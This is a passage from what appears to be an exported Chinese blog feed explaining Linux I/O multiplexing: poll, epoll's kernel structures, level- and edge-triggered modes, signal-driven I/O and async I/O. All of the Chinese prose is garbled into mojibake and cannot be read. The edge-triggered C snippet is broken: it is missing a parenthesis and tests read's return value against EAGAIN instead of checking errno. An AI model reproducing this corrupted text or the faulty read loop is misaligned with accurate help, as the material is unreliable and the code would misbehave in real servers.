<li>åŒ…å«å¤§é‡ fd çš„æ•°ç»„åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åœ°å€ç©ºé—´åå¤å¤åˆ¶ï¼Œè€Œä¸è®ºè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦å°±ç»ªï¼Œå®ƒçš„å¼€é”€éšç€æ–‡ä»¶æè¿°ç¬¦æ•°é‡çš„å¢åŠ è€Œçº¿æ€§å¢å¤§ã€‚</li>
</ol>
<h4 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h4><p>poll çš„æœºåˆ¶ä¸ select ç±»ä¼¼ï¼Œä¸ select åœ¨æœ¬è´¨ä¸Šæ²¡æœ‰å¤šå¤§å·®åˆ«ï¼Œç®¡ç†å¤šä¸ªæè¿°ç¬¦ä¹Ÿæ˜¯è¿›è¡Œè½®è¯¢ï¼Œä¹Ÿéœ€è¦åå¤åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€ä¹‹é—´å¤åˆ¶ç»“æ„ä½“ï¼Œä½†æ˜¯ poll é‡‡ç”¨é“¾è¡¨çš„æ–¹å¼æ›¿æ¢åŸæœ‰ fd_setï¼Œä½¿å…¶<strong>æ²¡æœ‰è¿æ¥æ•°çš„é™åˆ¶</strong>ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd* fds, <span class="keyword">unsigned</span> <span class="keyword">int</span> nfds, <span class="keyword">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> fd;             <span class="comment">/* æ–‡ä»¶æè¿°ç¬¦ */</span></span><br><span class="line"><span class="keyword">short</span> events;       <span class="comment">/* æœŸæœ›çš„äº‹ä»¶ */</span></span><br><span class="line"><span class="keyword">short</span> revents;      <span class="comment">/* å®é™…å‘ç”Ÿçš„äº‹ä»¶ */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸€ä¸ª pollfd æŒ‡å®šä¸€ä¸ªè¢«ç›‘è§†çš„ fdã€‚ä¼ é€’ä¸€ä¸ª pollfd é“¾è¡¨æŒ‡ç¤º poll ç›‘è§†å¤šä¸ª fdã€‚æ¯ä¸ªç»“æ„ä½“çš„ events åŸŸæ˜¯ç›‘è§†è¯¥æ–‡ä»¶æè¿°ç¬¦çš„äº‹ä»¶æ©ç ï¼Œç”±ç”¨æˆ·æ¥è®¾ç½®è¿™ä¸ªåŸŸã€‚revents åŸŸæ˜¯æ–‡ä»¶æè¿°ç¬¦çš„æ“ä½œç»“æœäº‹ä»¶æ©ç ï¼Œå†…æ ¸åœ¨è°ƒç”¨è¿”å›æ—¶è®¾ç½®è¿™ä¸ªåŸŸã€‚</p>
<h4 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h4><p>è®¾æƒ³ä¸€ä¸‹å¦‚ä¸‹åœºæ™¯ï¼šæœ‰ 100 ä¸‡ä¸ªå®¢æˆ·ç«¯åŒæ—¶ä¸ä¸€ä¸ªæœåŠ¡å™¨è¿›ç¨‹ä¿æŒç€ TCP è¿æ¥ã€‚è€Œæ¯ä¸€æ—¶åˆ»ï¼Œé€šå¸¸åªæœ‰å‡ ç™¾ä¸Šåƒä¸ª TCP è¿æ¥æ˜¯æ´»è·ƒçš„(äº‹å®ä¸Šå¤§éƒ¨åˆ†åœºæ™¯éƒ½æ˜¯è¿™ç§æƒ…å†µ)ã€‚å¦‚ä½•å®ç°è¿™æ ·çš„é«˜å¹¶å‘ï¼Ÿ</p>
<p>åœ¨ select/poll æ—¶ä»£ï¼ŒæœåŠ¡å™¨è¿›ç¨‹æ¯æ¬¡éƒ½æŠŠè¿™ 100 ä¸‡ä¸ªè¿æ¥å‘Šè¯‰æ“ä½œç³»ç»Ÿ(ä»ç”¨æˆ·æ€å¤åˆ¶å¥æŸ„æ•°æ®ç»“æ„åˆ°å†…æ ¸æ€)ï¼Œè®©æ“ä½œç³»ç»Ÿå†…æ ¸å»æŸ¥è¯¢è¿™äº›å¥—æ¥å­—ä¸Šæ˜¯å¦æœ‰äº‹ä»¶å‘ç”Ÿï¼Œè½®è¯¢å®Œåï¼Œå†å°†å¥æŸ„æ•°æ®å¤åˆ¶åˆ°ç”¨æˆ·æ€ï¼Œè®©æœåŠ¡å™¨åº”ç”¨ç¨‹åºè½®è¯¢å¤„ç†å·²å‘ç”Ÿçš„ç½‘ç»œäº‹ä»¶ï¼Œè¿™ä¸€è¿‡ç¨‹èµ„æºæ¶ˆè€—è¾ƒå¤§ï¼Œå› æ­¤ï¼Œselect/poll ä¸€èˆ¬åªèƒ½å¤„ç†å‡ åƒçš„å¹¶å‘è¿æ¥ã€‚</p>
<p>epoll æ˜¯æ˜¯ä¹‹å‰çš„ select/poll çš„å¢å¼ºç‰ˆæœ¬ã€‚ç›¸æ¯” select/pollï¼Œepoll æ›´åŠ çµæ´»ï¼Œæ²¡æœ‰æè¿°ç¬¦é™åˆ¶ã€‚epoll ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç®¡ç†å¤šä¸ªæè¿°ç¬¦ï¼Œå°†ç”¨æˆ·å…³ç³»çš„æ–‡ä»¶æè¿°ç¬¦çš„äº‹ä»¶å­˜æ”¾åˆ°å†…æ ¸çš„ä¸€ä¸ªäº‹ä»¶è¡¨ä¸­ï¼Œè¿™æ ·åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„ copy åªéœ€ä¸€æ¬¡ã€‚</p>
<p>epoll æä¾›ä¸‰ä¸ªæ¥å£ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªepollçš„å¥æŸ„ï¼Œsizeç”¨æ¥å‘Šè¯‰å†…æ ¸è¿™ä¸ªç›‘å¬çš„æ•°ç›®ä¸€å…±æœ‰å¤šå¤§ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* epollçš„äº‹ä»¶æ³¨å†Œå‡½æ•°ï¼Œæ³¨å†Œè¦ç›‘å¬çš„äº‹ä»¶ç±»å‹ã€‚</span></span><br><span class="line"><span class="comment">ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ epoll_create()çš„è¿”å›å€¼ï¼›</span></span><br><span class="line"><span class="comment">ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºåŠ¨ä½œï¼Œç”¨ä¸‰ä¸ªå®æ¥è¡¨ç¤ºï¼šEPOLL_CTL_ADDï¼ŒEPOLL_CTL_MODï¼ŒEPOLL_CTL_DELï¼›</span></span><br><span class="line"><span class="comment">ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯éœ€è¦ç›‘å¬çš„ fdï¼›</span></span><br><span class="line"><span class="comment">ç¬¬å››ä¸ªå‚æ•°æ˜¯å‘Šè¯‰å†…æ ¸éœ€è¦ç›‘å¬ä»€ä¹ˆäº‹ */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd, <span class="keyword">int</span> op, <span class="keyword">int</span> fd, struct epoll_event* event)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ç­‰å¾…äº‹ä»¶çš„äº§ç”Ÿï¼Œç±»ä¼¼äºselect()è°ƒç”¨ã€‚å‚æ•°eventsç”¨æ¥ä»å†…æ ¸å¾—åˆ°äº‹ä»¶çš„é›†åˆï¼Œmaxeventså‘Šä¹‹å†…æ ¸è¿™ä¸ªeventsæœ‰å¤šå¤§ï¼Œè¿™ä¸ªmaxeventsçš„å€¼ä¸èƒ½å¤§äºåˆ›å»ºepoll_create()æ—¶çš„size */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd, struct epoll_event* events, <span class="keyword">int</span> maxevents, <span class="keyword">int</span> timeout)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€æ­¥ï¼šepoll_create ç³»ç»Ÿè°ƒç”¨ã€‚æ­¤è°ƒç”¨è¿”å›ä¸€ä¸ªå¥æŸ„ï¼Œä¹‹åæ‰€æœ‰çš„ä½¿ç”¨éƒ½ä¾é è¿™ä¸ªå¥æŸ„æ¥æ ‡è¯†ã€‚</p>
<p>ç¬¬äºŒæ­¥ï¼šepoll_ctl ç³»ç»Ÿè°ƒç”¨ã€‚é€šè¿‡æ­¤è°ƒç”¨å‘ epoll å¯¹è±¡ä¸­æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹æ„Ÿå…´è¶£çš„äº‹ä»¶ï¼Œè¿”å› 0 è¡¨ç¤ºæˆåŠŸï¼Œè¿”å› -1 è¡¨ç¤ºå¤±è´¥ã€‚</p>
<p>ç¬¬ä¸‰éƒ¨ï¼šepoll_wait ç³»ç»Ÿè°ƒç”¨ã€‚é€šè¿‡æ­¤è°ƒç”¨æ”¶é›†æ”¶é›†åœ¨ epoll ç›‘æ§ä¸­å·²ç»å‘ç”Ÿçš„äº‹ä»¶ã€‚</p>
<p><strong>ä¸‹é¢æ¥çœ‹çœ‹ epoll æ˜¯æ€ä¹ˆå®ç°çš„ï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> &#123;</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">/*çº¢é»‘æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œè¿™é¢—æ ‘ä¸­å­˜å‚¨ç€æ‰€æœ‰æ·»åŠ åˆ°epollä¸­çš„éœ€è¦ç›‘æ§çš„äº‹ä»¶*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span>  <span class="title">rbr</span>;</span></span><br><span class="line">    <span class="comment">/*åŒé“¾è¡¨ä¸­åˆ™å­˜æ”¾ç€å°†è¦é€šè¿‡epoll_waitè¿”å›ç»™ç”¨æˆ·çš„æ»¡è¶³æ¡ä»¶çš„äº‹ä»¶*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">rdlist</span>;</span></span><br><span class="line">    ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡è°ƒç”¨ epoll_create æ–¹æ³•ï¼Œå†…æ ¸åˆ›å»ºä¸€ä¸ª eventpoll ç»“æ„ä½“ï¼Œç”¨äºå­˜æ”¾é€šè¿‡ epoll_ctl æ–¹æ³•å‘epollå¯¹è±¡ä¸­æ·»åŠ è¿›æ¥çš„äº‹ä»¶ã€‚è¿™äº›äº‹ä»¶éƒ½ä¼šæŒ‚è½½åœ¨çº¢é»‘æ ‘ä¸­ï¼Œå¦‚æ­¤ï¼Œé‡å¤æ·»åŠ çš„äº‹ä»¶å°±å¯ä»¥é€šè¿‡çº¢é»‘æ ‘è€Œé«˜æ•ˆçš„è¯†åˆ«å‡ºæ¥ã€‚</p>
<p>æ‰€æœ‰æ·»åŠ åˆ° epoll ä¸­çš„äº‹ä»¶éƒ½ä¼šä¸è®¾å¤‡(ç½‘å¡ç­‰)å»ºç«‹å›è°ƒå…³ç³»ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç›¸åº”çš„äº‹ä»¶å‘ç”Ÿæ—¶ä¼šè°ƒç”¨è¿™ä¸ªå›è°ƒæ–¹æ³•ã€‚è¿™ä¸ªå›è°ƒæ–¹æ³•åœ¨å†…æ ¸ä¸­å« ep_poll_callbackï¼Œå®ƒä¼šå°†å‘ç”Ÿçš„äº‹ä»¶æ·»åŠ åˆ° rdlist åŒé“¾è¡¨ä¸­ã€‚</p>
<p>æ¯ä¸€ä¸ªäº‹ä»¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ epitem ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epitem</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span>  <span class="title">rbn</span>;</span><span class="comment">//çº¢é»‘æ ‘èŠ‚ç‚¹</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">rdllink</span>;</span><span class="comment">//åŒå‘é“¾è¡¨èŠ‚ç‚¹</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_filefd</span>  <span class="title">ffd</span>;</span>  <span class="comment">//äº‹ä»¶å¥æŸ„ä¿¡æ¯</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> *<span class="title">ep</span>;</span>    <span class="comment">//æŒ‡å‘å…¶æ‰€å±çš„eventpollå¯¹è±¡</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span> <span class="comment">//æœŸå¾…å‘ç”Ÿçš„äº‹ä»¶ç±»å‹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“è°ƒç”¨ epoll_wait æ£€æŸ¥æ˜¯å¦æœ‰äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œåªéœ€è¦æ£€æŸ¥ eventpoll å¯¹è±¡ä¸­çš„ rdlist åŒé“¾è¡¨ä¸­æ˜¯å¦æœ‰ epitem å…ƒç´ å³å¯ã€‚å¦‚æœ rdlist ä¸ä¸ºç©ºï¼Œåˆ™æŠŠå‘ç”Ÿçš„äº‹ä»¶å¤åˆ¶åˆ°ç”¨æˆ·æ€ï¼ŒåŒæ—¶å°†äº‹ä»¶æ•°é‡è¿”å›ç»™ç”¨æˆ·:</p>
<p><img src="https://i.loli.net/2020/04/24/ZVMg1j5dHoRU6Bf.png" alt="Epollå®ç°"></p>
<p>ä¼˜ç‚¹ï¼š</p>
<ol>
<li>æ”¯æŒä¸€ä¸ªè¿›ç¨‹æŒæœ‰å¤§æ•°ç›®çš„ fdã€‚epoll åº•å±‚ç”¨çº¢é»‘æ ‘ç®¡ç† fdï¼Œæ‰€æ”¯æŒçš„ fd ä¸Šé™æ˜¯æœ€å¤§å¯ä»¥æ‰“å¼€æ–‡ä»¶çš„æ•°ç›®ã€‚</li>
<li>IO æ•ˆç‡ä¸éš fd æ•°ç›®å¢åŠ è€Œçº¿æ€§ä¸‹é™ã€‚ä¸¾ä¸ªä¾‹å­ï¼šä¼ ç»Ÿçš„ select/poll å¦ä¸€ä¸ªè‡´å‘½å¼±ç‚¹å°±æ˜¯å½“ä½ æ‹¥æœ‰ä¸€ä¸ªå¾ˆå¤§çš„ socket é›†åˆï¼Œä»»ä¸€æ—¶é—´åªæœ‰éƒ¨åˆ† socket å¤„äº ready çŠ¶æ€ã€‚ä½†æ˜¯ select/poll æ¯æ¬¡è°ƒç”¨è¿”å›åéƒ½è¦çº¿æ€§æ‰«æå…¨éƒ¨çš„ socketã€æ£€æŸ¥æ‰€æœ‰ socket çš„çŠ¶æ€ï¼Œå¯¼è‡´æ•ˆç‡å‘ˆç°çº¿æ€§ä¸‹é™ã€‚epoll ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå®ƒåªä¼šå¯¹ ready socket è¿›è¡Œæ“ä½œã€‚</li>
<li>epoll å¯¹æ¯ä¸ª fd åªä¼šè¿›è¡Œä¸€æ¬¡ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„å¤åˆ¶ã€‚</li>
</ol>
<h2 id="æ°´å¹³è§¦å‘ä¸è¾¹ç¼˜è§¦å‘"><a href="#æ°´å¹³è§¦å‘ä¸è¾¹ç¼˜è§¦å‘" class="headerlink" title="æ°´å¹³è§¦å‘ä¸è¾¹ç¼˜è§¦å‘"></a>æ°´å¹³è§¦å‘ä¸è¾¹ç¼˜è§¦å‘</h2><ul>
<li>æ°´å¹³è§¦å‘ï¼ˆLevel Triggered, LTï¼‰ï¼šåªè¦æ–‡ä»¶æè¿°ç¬¦å…³è”çš„è¯»å†…æ ¸ç¼“å†²åŒºéç©ºï¼Œæœ‰æ•°æ®å¯ä»¥è¯»å–ï¼Œå°±ä¸€ç›´å‘å‡ºå¯è¯»ä¿¡å·è¿›è¡Œé€šçŸ¥ï¼Œå½“æ–‡ä»¶æè¿°ç¬¦å…³è”çš„å†…æ ¸å†™ç¼“å†²åŒºä¸æ»¡ï¼Œæœ‰ç©ºé—´å¯ä»¥å†™å…¥ï¼Œå°±ä¸€ç›´å‘å‡ºå¯å†™ä¿¡å·è¿›è¡Œé€šçŸ¥ã€‚LT åŒæ—¶æ”¯æŒé˜»å¡ IO ä¸éé˜»å¡ IOã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå†…æ ¸å‘Šè¯‰ä½ ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ˜¯å¦å°±ç»ªäº†ï¼Œç„¶åä½ å¯ä»¥å¯¹è¿™ä¸ªå°±ç»ªçš„ fd è¿›è¡Œ IO æ“ä½œã€‚å¦‚æœä½ ä¸ä½œä»»ä½•æ“ä½œï¼Œå†…æ ¸è¿˜æ˜¯ä¼šç»§ç»­é€šçŸ¥ä½ çš„ï¼Œæ‰€ä»¥ï¼Œè¿™ç§æ¨¡å¼ç¼–ç¨‹å‡ºé”™è¯¯å¯èƒ½æ€§è¦å°ä¸€ç‚¹ã€‚<strong>ä¼ ç»Ÿçš„ select/poll éƒ½æ˜¯é‡‡ç”¨è¿™ç§æ¨¡å¼ï¼Œepoll é»˜è®¤ä¹Ÿæ˜¯è¿™ç§æ¨¡å¼</strong>ã€‚</li>
<li>è¾¹ç¼˜è§¦å‘ï¼ˆEdge Triggered, ETï¼‰ï¼šå½“æ–‡ä»¶æè¿°ç¬¦å…³è”çš„è¯»å†…æ ¸ç¼“å†²åŒºç”±ç©ºè½¬åŒ–ä¸ºéç©ºçš„æ—¶å€™ï¼Œåˆ™å‘å‡ºå¯è¯»ä¿¡å·è¿›è¡Œé€šçŸ¥ï¼Œå½“æ–‡ä»¶æè¿°ç¬¦å…³è”çš„å†…æ ¸å†™ç¼“å†²åŒºç”±æ»¡è½¬åŒ–ä¸ºä¸æ»¡çš„æ—¶å€™ï¼Œåˆ™å‘å‡ºå¯å†™ä¿¡å·è¿›è¡Œé€šçŸ¥ã€‚äº‹ä»¶é€šçŸ¥ä»…åœ¨è¢«ç›‘å¬æ–‡ä»¶æè¿°ç¬¦çš„ç¼“å†²åŒºçŠ¶æ€åœ¨æ»¡/ä¸æ»¡ä¹‹é—´å˜åŒ–çš„æ—¶å€™æ‰ä¼šå‘ç”Ÿä¸€æ¬¡ã€‚è¾¹ç¼˜è§¦å‘éœ€è¦ä¸€æ¬¡æ€§çš„æŠŠç¼“å†²åŒºçš„æ•°æ®è¯»å®Œï¼Œä¹Ÿå°±æ˜¯ä¸€ç›´è¯»ç›´åˆ°è¯»åˆ° EGAIN ï¼ˆç¼“å†²åŒºä¸ºç©ºï¼‰ä¸ºæ­¢ï¼Œå¦åˆ™åœ¨è¿™ä¸ª fd çš„å†…æ ¸ç¼“å†²åŒºä¸‹ä¸€æ¬¡å¤„äºæ»¡çŠ¶æ€å‰æ— æ³•å†æ¬¡è·å¾—å®ƒã€‚å› ä¸ºè¿™ä¸€ç‚¹ï¼Œè¾¹ç¼˜è§¦å‘éœ€è¦è®¾ç½®æ–‡ä»¶å¥æŸ„ä¸ºéé˜»å¡ã€‚</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ°´å¹³è§¦å‘ï¼Œå°±ç®— buf å®¹é‡ä¸è¶³ï¼Œä¸‹æ¬¡ç›‘å¬ç³»ç»Ÿä¹Ÿä¼š fd</span></span><br><span class="line">ret = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾¹ç¼˜è§¦å‘ï¼Œè¯»å°±è¦ä¸€æ¬¡æ€§è¯»å®Œï¼Œå¦åˆ™ä¸‹æ¬¡ç›‘å¬ç³»ç»Ÿæœªå¿…ä¼šå†è¿”å› fd</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    ret = read(fd, buf, <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> (ret == EAGAIN) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“ï¼š</p>
<ol>
<li>å¯¹äºç›‘å¬çš„sockfdï¼Œæœ€å¥½ä½¿ç”¨æ°´å¹³è§¦å‘æ¨¡å¼ï¼Œè¾¹ç¼˜è§¦å‘æ¨¡å¼ä¼šå¯¼è‡´é«˜å¹¶å‘æƒ…å†µä¸‹ï¼Œæœ‰çš„å®¢æˆ·ç«¯ä¼šè¿æ¥ä¸ä¸Š</li>
<li>å¯¹äºè¯»å†™çš„connfdï¼Œæ°´å¹³è§¦å‘æ¨¡å¼ä¸‹ï¼Œé˜»å¡å’Œéé˜»å¡æ•ˆæœéƒ½ä¸€æ ·</li>
<li>å¯¹äºè¯»å†™çš„connfdï¼Œè¾¹ç¼˜è§¦å‘æ¨¡å¼ä¸‹ï¼Œå¿…é¡»ä½¿ç”¨éé˜»å¡IOï¼Œå¹¶è¦ä¸€æ¬¡æ€§å…¨éƒ¨è¯»å†™å®Œæ•°æ®</li>
</ol>
<h2 id="ä¿¡å·-IO"><a href="#ä¿¡å·-IO" class="headerlink" title="ä¿¡å· IO"></a>ä¿¡å· IO</h2><p>è®©å†…æ ¸åœ¨æè¿°ç¬¦å°±ç»ªæ—¶å‘é€ SIGIO ä¿¡å·é€šçŸ¥è¿›ç¨‹ã€‚è¿™ç§æ¨¡å‹ä¸ºä¿¡å·é©±åŠ¨å¼ IOï¼ˆsignal-driven IOï¼‰ï¼Œå’Œäº‹ä»¶é©±åŠ¨ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç§å›è°ƒæ–¹å¼ã€‚ä¸éé˜»å¡æ–¹å¼ä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯ï¼Œå‘èµ·äº†ä¿¡å·é©±åŠ¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¿›ç¨‹æ²¡æœ‰æŒ‚èµ·ï¼Œå¯ä»¥åšçš„äº‹æƒ…ï¼Œå¯æ˜¯å®é™…ä¸­ï¼Œä»£ç é€»è¾‘é€šå¸¸è¿˜æ˜¯ä¸»å¾ªç¯ï¼Œä¸»å¾ªç¯é‡Œå¯èƒ½è¿˜æ˜¯ä¼šé˜»å¡ã€‚å› æ­¤ä½¿ç”¨è¿™æ ·çš„ IO çš„è½¯ä»¶å¾ˆå°‘ã€‚</p>
<p>å½“ä¿¡å·è¿”å›å¯ä»¥è¯»å†™çš„æ—¶å€™ï¼Œå› ä¸ºè¿˜éœ€è¦ cpu å°†å†…æ ¸æ•°æ® copy åˆ° app bufï¼Œæ‹·è´æ•°æ®é˜¶æ®µæ¯«æ— ç–‘é—®è¿˜æ˜¯é˜»å¡çš„ã€‚</p>
<p><img src="https://i.loli.net/2020/04/17/73r6sTCnzG45HFN.png" alt="ä¿¡å·IO"></p>
<h2 id="å¼‚æ­¥-IO"><a href="#å¼‚æ­¥-IO" class="headerlink" title="å¼‚æ­¥ IO"></a>å¼‚æ­¥ IO</h2><p>å¼‚æ­¥æ˜¯æŒ‡åº”ç”¨ä¸å†…æ ¸å­˜åœ¨ CPU ç«äº‰ï¼ˆåœ¨åŒæ­¥ IO ä¸­åº”ç”¨éƒ½æ˜¯ç­‰ kernel buf ä¸­çš„æ•°æ®æ‹·è´åˆ° app buf åå†æ‰§è¡Œçš„ï¼‰ã€‚</p>
<p><img src="https://i.loli.net/2020/04/17/lYpgvAdNwyQuCr9.png" alt="å¼‚æ­¥IO"></p>
<p>æ— è®ºæ˜¯ç¬¬ä¸€é˜¶æ®µæ•°æ®å‡†å¤‡è¿˜æ˜¯ç¬¬äºŒé˜¶æ®µæ•°æ®æ‹·è´ï¼Œå‘èµ·ç³»ç»Ÿè°ƒç”¨çš„è¿›ç¨‹éƒ½ä¸ä¼šè¢«é˜»å¡ã€‚ç¬¬äºŒé˜¶æ®µè¿‡ç¨‹ä¸­ï¼Œè¿›ç¨‹æ²¡æœ‰é˜»å¡ï¼Œé‚£ä¹ˆå¯ä»¥æŠ¢å  CPUï¼Œè€Œ kernel buf copy æ•°æ®åˆ° app buf çš„æ—¶å€™ï¼Œä¹Ÿéœ€è¦ CPUï¼Œè¿™å°±é€ æˆäº†åº”ç”¨å’Œå†…æ ¸è¿›è¡Œ CPU ç«äº‰ï¼Œæ­¥è°ƒä¸ä¸€è‡´äº†ã€‚æŸäº›æƒ…å†µä¸‹ï¼Œå…¶æ€§èƒ½åè€Œä¸å¦‚å…¶ä»– IO æ¨¡å¼ã€‚ä½¿ç”¨çš„äººä¹Ÿå¾ˆå°‘ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>IO å³æ•°æ®åœ¨ app bufã€kernel bufã€ç¡¬ä»¶ä¸‰è€…ä¹‹é—´çš„æµåŠ¨ã€‚</p>
<p>æ•°æ®ç­‰å¾…é˜¶æ®µæ ¹æ®å‘èµ· IO è¯·æ±‚çš„è¿›ç¨‹æ˜¯å¦é˜»å¡åˆ†ä¸ºï¼š</p>
<ul>
<li>é˜»å¡ï¼šè¿›ç¨‹æŒ‚èµ·</li>
<li>éé˜»å¡ï¼šè¿›ç¨‹ä¸æŒ‚èµ·ï¼Œç«‹å³è¿”å›ï¼Œè¿”å›EWOULDBLOCK</li>
</ul>
<p>æ•°æ®æ‹·è´é˜¶æ®µæ ¹æ®å‘èµ· IO è¯·æ±‚çš„è¿›ç¨‹æ˜¯å¦é˜»å¡åˆ†ä¸ºï¼š</p>
<ul>
<li>åŒæ­¥ï¼šå†…æ ¸æ‹·è´æ•°æ®å ç”¨ CPU</li>
<li>å¼‚æ­¥ï¼šè¿›ç¨‹å¯èƒ½å’Œå†…æ ¸ç«äº‰ CPU</li>
</ul>
<p>åŒæ­¥éé˜»å¡å°±æ˜¯ååˆ†å¸¸è§çš„å¤šè·¯å¤ç”¨ç»“åˆéé˜»å¡IOå®ç°çš„æ–¹æ¡ˆï¼Œä¹Ÿç§°ä¹‹ä¸ºäº‹ä»¶é©±åŠ¨ã€‚åŒæ­¥æœ‰åˆ©äºé€»è¾‘çš„ä¹¦å†™ï¼Œéé˜»å¡æœ‰åˆ©äºè°ƒç”¨ç‡å®ç°å¹¶å‘ã€‚å› æ­¤ç°å®ä¸­æ›´å¤šçš„IOæ¨¡å‹æ˜¯å¤šè·¯å¤ç”¨IOï¼Œå¹¶ä¸”åœ¨å‘å±•è¿‡ç¨‹ä¸­ï¼Œselectï¼Œpollå’Œepollæ˜¯é€æ­¥è¿›åŒ–é“¾ã€‚epollå®ç°äº†å†…æ ¸çº§æ•°æ®ç»“æ„ä¼˜åŒ–ï¼Œåœ¨å®é™…æ€§èƒ½ä¸Šåˆäº†å¾ˆå¤§çš„æå‡ã€‚</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://www.jianshu.com/p/e62f0ef9629d">ç®€æ˜ç½‘ç»œIO</a></p>
<p><a href="https://www.cnblogs.com/Anker/p/3265058.html">selectã€pollã€epollä¹‹é—´çš„åŒºåˆ«æ€»ç»“</a></p>
<p><a href="https://blog.csdn.net/cuiyifang/article/details/7957937">epollç®€ä»‹åŠä¾‹å­</a></p>
<p><a href="https://blog.csdn.net/u011063112/article/details/81771440">epollè¯¦è§£</a></p>
<p><a href="https://www.cnblogs.com/yorkyang/p/7688865.html">epollçš„æ°´å¹³è§¦å‘ä¸è¾¹ç¼˜è§¦å‘</a></p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>å¹¶å‘ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>å¹¶å‘ç¼–ç¨‹-ä»¥ Go ä¸ºä¾‹</title>
    <url>/2020/03/24/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B-%E4%BB%A5Go%E4%B8%BA%E4%BE%8B/</url>
